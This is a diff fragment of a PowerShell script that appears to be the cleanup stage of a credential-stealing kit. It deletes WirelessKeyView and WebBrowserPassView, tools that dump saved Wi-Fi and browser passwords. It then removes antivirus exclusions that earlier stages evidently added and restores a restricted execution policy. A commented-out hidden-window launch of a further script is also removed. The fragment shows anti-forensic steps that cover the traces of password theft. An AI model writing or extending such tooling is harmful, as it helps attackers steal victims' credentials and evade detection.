@@ -16,7 +16,7 @@ Remove-Item WNetWatcher.cfg
 Remove-Item WirelessKeyView.exe
 Remove-Item WebBrowserPassView.exe
 Remove-Item ciaoV2.ps1
-#Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
-#Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
-#powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
+Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
+Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
+Set-ExecutionPolicy restricted -Force #Reset script blocker
 exit #End .ps1 file
